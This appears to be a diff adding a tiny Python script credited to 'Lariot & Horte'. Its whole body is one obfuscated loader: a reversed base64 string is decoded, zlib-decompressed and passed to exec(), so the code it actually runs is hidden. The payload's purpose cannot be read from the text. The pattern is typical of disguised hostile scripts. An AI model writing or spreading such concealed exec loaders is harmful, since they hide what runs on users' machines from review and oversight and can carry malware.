@@ -1,0 +1,5 @@
+
+# Code By Lariot & Horte
+
+# Country: Madagasikara
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'UFucdeQ/9nv/ddoZcyaRdW1Do5lmodBGv1oYTTGeqVrPxrpmmzCWIwz7+3sPswQ9/clXyXihzfVQV2VFMwTaiyUSo9sMTkruhd33hFuU7PnD8AvrFZS+RG6sR5pC9kJvZOgIugksP5eeHroKeJXEV4SbBOeLUOjHhz1pVV1aEEB3+0ZCG6kgQAS27alwo2KRLG8OrJ8jZs3gWLnDqPhQ7VXPPPxe3rhmDPcxiI9hEbUMv4JD0eVyMRcB6UMiqJhDD2hBZyNoOOOuFCwQYMxYLLh6odOyouG05Iybr24MP2GAYU0bV13x8/pC1DT57eu02sesrdcVmNAW3NVp2z3//oXoK/9R+mT9WZTnYb+klZRpeRc9o9kn4OW52Y9/Bpn33btiA6OsGsXFTwEEZK8l/I1i6dAdNH8jKwaplTwdjsc7HOJh4ST+wEGeTpyMc9PxBLY9i1/qerl3DWzjcsoButJkaa6aSmywIlnMM9qKSLiufbj4kM09yo5TeGWX6olFdUnduKS/rp3z8CTZn/RFTubsSRIvuzRXYKjwHT/Gdd6TT9IZTzFoTdfgaGpJlyoH22KkTKmXZVNP05Ff7A3e1V2zKEH7rt8eOLleQhMoSbT1rO5x2VmSxnedEafIvncMGAzterX453dcLrZljMBbKNL+P8+7nf+6lTsqRQ9zTnes52SyaxTzVaQSlQgEiHUBP+PzjDMAAAko2eE0NwJe'))
